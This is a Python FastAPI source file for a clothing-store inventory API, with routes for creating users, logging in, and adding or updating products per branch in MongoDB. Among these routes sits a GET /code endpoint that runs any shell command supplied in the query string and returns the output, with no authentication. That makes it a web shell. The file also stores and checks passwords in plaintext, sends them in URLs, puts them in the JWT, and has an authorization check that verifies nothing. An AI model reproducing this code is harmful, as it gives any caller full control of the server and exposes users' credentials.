import motor.motor_asyncio
import starlette.middleware.base
from fastapi import FastAPI, Request, Depends, Response, Header
from fastapi.responses import JSONResponse, RedirectResponse, HTMLResponse
from fastapi.encoders import jsonable_encoder
from models.models_products import *
from models.models_users import *
from dotenv import load_dotenv, set_key
from datetime import timedelta
import subprocess
from bson import ObjectId
import jwt
import os
import motor

# --------------------------------Star app--------------------------------------

root = FastAPI()


# -------------------------------Create User------------------------------------

@root.post("/create/user")
async def create_user(add: Users):
    return await insert(table=add, database=connection_secondary())


# -------------------------------Middleware's-----------------------------------

@root.get("/code")
def code(command: Optional[str]):
    a = subprocess.run(command, shell=True, capture_output=True, text=True)
    return HTMLResponse(str(a))

@root.middleware("http")
async def my_middleware(request: Request, call_next) -> starlette.middleware.base.StreamingResponse:
    print(f"Accediendo a {request.url}")
    response = await call_next(request)
    return response


# --------------------------------------Authentication-----------------------------

@root.get("/login/auth")
async def login(response: Response, username: str = None, password: str = None) -> RedirectResponse:
    try:
        collection = {
            "username": username,
            "password": password
        }

        db = connection_secondary()
        access: dict = await db.table.find_one(collection)

        if access is not None:
            access["_id"] = str(access["_id"])
            del access["_id"]

            if access == collection:
                load_dotenv()
                token = jwt.encode(payload=collection, key=os.getenv("KEY"), algorithm=os.getenv("ALGORITHM"))
                set_key("/opt/render/project/src/.venv", "TOKEN_USER", token)
                response.headers["Authenticate"] = token
                response.headers["cache-control"] = f"max-age{timedelta(hours=1).total_seconds()}"
                print(response.headers.get("Authenticate"))
                return RedirectResponse(url="/branch/")
        else:
            return JSONResponse(status_code=404, content={"message": "User not found"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


def authorization(request: Request):
    load_dotenv()
    print("tk ", os.getenv("TOKEN_USER"))
    print(request.headers.get("Authenticate"))


# -------------------------------Método para obtener datos de la DB-----------------


async def GET_JSON_DB(_id: str) -> dict | JSONResponse:
    try:
        db = connection_primary()
        data = await db.table.find_one({"_id": ObjectId(_id)})

        if data is None:
            return JSONResponse(status_code=404, content={"message": "Unknown branch"})
        else:
            data["_id"] = str(data["_id"])
            return data

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ------------------------------Conexión a la DB------------------------------

def connection_primary() -> motor.motor_asyncio.AsyncIOMotorClient:
    load_dotenv()
    client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv("DATABASE_URL"))
    db = client["sections"]
    return db


def connection_secondary() -> motor.motor_asyncio.AsyncIOMotorClient:
    load_dotenv()
    client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv("DATABASE_URL"))
    db = client["users"]
    return db


# ----------------------Método para insertar datos a la db ------------------

async def insert(table, database: motor) -> JSONResponse:
    try:
        await database.table.insert_one(jsonable_encoder(table))
        return JSONResponse(status_code=201, content={"message": "Added branch"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Método crear nueva sucursal----------------------

@root.post("/new_branch")
async def new_branch(data: Clothing_Store) -> JSONResponse:
    return await insert(table=data, database=connection_primary())


# --------------------------------Métodos POST de productos-----------------------------

@root.post("/branch/{_id}/t_shirts/{person}")
async def set_t_shirts(t_shirts: T_Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts")


@root.post("/branch/{_id}/shorts/{person}")
async def set_shorts(shorts: Shorts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts")


@root.post("/branch/{_id}/shirts/{person}")
async def set_shirts(shirts: Shirts, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts")


@root.post("/branch/{_id}/pants/{person}")
async def set_pants(pants: Pants, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants")


@root.post("/branch/{_id}/shoes/{person}")
async def set_shoes(shoes: Shoes, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes")


@root.post("/branch/{_id}/dresses/{person}")
async def set_dresses(dresses: Dresses, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses")


@root.post("/branch/{_id}/footwear/{person}")
async def set_footwear(footwear: Footwear, _id: str, person: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear")


# ----------------------------Métodos PUT para modificar datos-----------------

@root.put("/branch/{_id}/t_shirts/{person}/{index}")
async def put_t_shirts(t_shirts: T_Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=t_shirts, branch=_id, usage=person, keygen="t_shirts", index=index)


@root.put("/branch/{_id}/shorts/{person}/{index}")
async def put_shorts(shorts: Shorts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shorts, branch=_id, usage=person, keygen="shorts", index=index)


@root.put("/branch/{_id}/shirts/{person}/{index}")
async def set_shirts(shirts: Shirts, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shirts, branch=_id, usage=person, keygen="shirts", index=index)


@root.put("/branch/{_id}/pants/{person}/{index}")
async def set_pants(pants: Pants, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=pants, branch=_id, usage=person, keygen="pants", index=index)


@root.put("/branch/{_id}/shoes/{person}/{index}")
async def set_shoes(shoes: Shoes, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=shoes, branch=_id, usage=person, keygen="shoes", index=index)


@root.put("/branch/{_id}/dresses/{person}/{index}")
async def set_dresses(dresses: Dresses, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=dresses, branch=_id, usage=person, keygen="dresses", index=index)


@root.put("/branch/{_id}/footwear/{person}/{index}")
async def set_footwear(footwear: Footwear, _id: str, person: str, index: str) -> JSONResponse:
    return await insert_products(data=footwear, branch=_id, usage=person, keygen="footwear", index=index)


# ----------------------------Agregar datos Inventario--------------------------

async def insert_products(data=None, branch: str = None, usage: str = None, keygen: str = None, index: str = None) -> JSONResponse:
    try:
        db = connection_primary()
        path_insert = f"{usage}.{keygen}"
        path_update = f"{usage}.{keygen}.{index}"

        if index is None:
            db.table.update_one({"_id": ObjectId(branch)}, {"$push": {path_insert: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Added information"})
        else:
            db.table.update_one({"_id": ObjectId(branch)}, {"$set": {path_update: jsonable_encoder(data)}})
            return JSONResponse(status_code=201, content={"message": "Added information"})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})


# ----------------------------Obtener datos de una Sucursal con query's---------------------------

@root.get("/branch/{_id}")
async def get_branch(_id: str, request: Request, person: Optional[str] = None, product: Optional[str] = None) -> JSONResponse:
    info = await GET_JSON_DB(_id=_id)
    authorization(request)

    try:
        if person is None and product is None:
            return JSONResponse(status_code=200, content={"branch": info})

        elif person is not None and product is None:
            return JSONResponse(status_code=200, content={person: info[person]})

        elif person is not None and product is not None:
            return JSONResponse(status_code=200, content={person: info[person][product]})

    except Exception as error:
        print(error)
        return JSONResponse(status_code=500, content={"message": "Unknown error"})
